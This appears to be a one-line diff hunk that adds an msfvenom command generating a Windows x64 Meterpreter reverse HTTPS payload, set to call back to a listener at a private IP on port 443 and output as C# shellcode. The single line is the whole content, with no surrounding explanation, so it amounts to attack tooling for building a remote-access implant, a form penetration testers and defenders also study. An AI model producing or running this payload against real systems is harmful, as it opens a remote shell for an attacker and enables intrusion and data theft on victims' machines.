@@ -1,0 +1,1 @@
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.21.23.27 LPORT=443 -f csharp
